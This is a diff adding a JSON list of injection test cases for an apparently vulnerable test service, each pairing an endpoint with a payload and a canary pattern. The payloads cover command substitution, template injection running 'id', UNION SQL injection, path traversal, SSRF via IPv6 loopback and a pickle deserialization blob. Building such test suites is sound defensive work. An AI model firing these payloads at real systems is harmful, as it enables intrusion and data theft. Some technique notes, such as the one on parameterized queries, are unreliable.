@@ -1,0 +1,72 @@
+[
+  {
+    "id": "dyn_deser_1",
+    "endpoint": "/load",
+    "method": "POST",
+    "params": {
+      "data": "gASVJQAAAAAAAC5dq1KCTWF0aGsKU3lzdGVtCnEAKVJxAVgGAAAAY2FsbGVkcQJ9cQNiLg=="
+    },
+    "detect_pattern": "CANARY_DESER_9a1f7b",
+    "technique": "pickle opcode manipulation with __reduce__ chain to bypass filters"
+  },
+  {
+    "id": "dyn_cmd_2",
+    "endpoint": "/ping",
+    "method": "POST",
+    "params": {
+      "host": "127.0.0.1$(id)"
+    },
+    "detect_pattern": "uid=[0-9]+\\(",
+    "technique": "$(...) command substitution without parens in block_patterns"
+  },
+  {
+    "id": "dyn_cmd_3",
+    "endpoint": "/ping",
+    "method": "POST",
+    "params": {
+      "host": "127.0.0.1`id`"
+    },
+    "detect_pattern": "uid=[0-9]+\\(",
+    "technique": "backtick command substitution (backticks in block_patterns but may not block execution context)"
+  },
+  {
+    "id": "dyn_ssrf_2",
+    "endpoint": "/fetch",
+    "method": "GET",
+    "params": {
+      "url": "http://[::1]:8080/healthz"
+    },
+    "detect_pattern": "CANARY_SSRF_3e7d2c",
+    "technique": "IPv6 loopback bypass for host allowlist"
+  },
+  {
+    "id": "dyn_path_2",
+    "endpoint": "/read",
+    "method": "GET",
+    "params": {
+      "name": "..\\..\\..\\tmp\\path_canary.txt"
+    },
+    "detect_pattern": "CANARY_PATH_5c9e0a",
+    "technique": "backslash path traversal (Windows-style) to bypass .. substring check"
+  },
+  {
+    "id": "dyn_sqli_2",
+    "endpoint": "/search",
+    "method": "GET",
+    "params": {
+      "q": "' UNION SELECT flag FROM secrets WHERE '1'='1"
+    },
+    "detect_pattern": "CANARY_SQLI_7f3a9c",
+    "technique": "UNION-based SQLi (parameterized queries may still be vulnerable if not properly implemented)"
+  },
+  {
+    "id": "dyn_ssti_2",
+    "endpoint": "/render",
+    "method": "POST",
+    "params": {
+      "template": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
+    },
+    "detect_pattern": "uid=[0-9]+\\(",
+    "technique": "sandbox escape via __class__ chain (SandboxedEnvironment blocks _ but may allow __)"
+  }
+]
